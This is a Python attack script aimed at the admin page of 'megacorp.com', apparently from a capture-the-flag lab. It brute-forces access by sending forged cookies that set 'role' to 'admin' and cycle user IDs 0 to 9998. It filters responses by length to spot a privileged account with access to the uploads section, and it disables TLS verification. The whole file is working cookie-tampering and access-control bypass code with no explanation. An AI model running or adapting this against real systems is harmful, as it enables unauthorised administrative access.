#!/usr/bin/env python3
import requests

url = "http://megacorp.com/cdn-cgi/login/admin.php"

headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Proxy-Connection": "keep-alive",
    "Referer": "http://megacorp.com/cdn-cgi/login/admin.php?content=uploads",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
}


params = {"content": "uploads"}

# Make the request
filter_length = 3530
filter_length_list = [3530, 4735]
# for n in range(9999):
#     cookies = {"user": str(n), "role": "admin"}
#     r = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False)
#     if len(r.content) not in filter_length_list:
#         print(r.text)
#         print(cookies)


# print(f"Status: {r.status_code}")
# print(f"Length: {len(r.content)} bytes")
# print(r.text)


import urllib3
urllib3.disable_warnings()

s = requests.Session()
s.headers.update(headers)
s.verify = False

for n in range(9999):
    cookies = {"user": str(n), "role": "admin"}
    r = s.get(url, params=params, cookies=cookies)
    if len(r.content) not in filter_length_list:
        print(r.text, cookies)
